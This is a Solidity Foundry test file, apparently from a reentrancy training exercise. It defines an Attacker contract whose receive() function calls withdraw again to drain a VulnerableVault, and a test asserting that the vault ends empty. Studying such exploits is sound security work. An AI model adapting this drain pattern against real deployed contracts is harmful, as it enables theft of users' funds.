// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/Console.sol";
import {VulnerableVault} from "../../src/Week1/Day1_Reentrancy.sol";
interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
   IVulnerableVault public vault;
   constructor(address _vault){
    vault = IVulnerableVault(_vault);
   }

   function attack() external payable{
    vault.deposit{value: 1 ether}();
    vault.withdraw();
   }

   receive() external payable{
    if(address(vault).balance >= 1 ether){
        vault.withdraw();
    }
   }
}



contract VaultTest is Test {
Attacker attacker;
VulnerableVault vault;
function setUp() public{
    vault = new VulnerableVault();
    vm.deal(address(vault),5 ether);
}


function test_exploit() public{
    attacker = new Attacker(address(vault));
    vm.deal(address(attacker),1 ether);

    console.log("Vault balance before attack",address(vault).balance);
    console.log("Attacker balance before attack",address(attacker).balance);
    attacker.attack();
    console.log("Vault balance after attack",address(vault).balance);
    console.log("Attacker balance afters attack",address(attacker).balance);
    assertEq(address(vault).balance, 0);
}

}
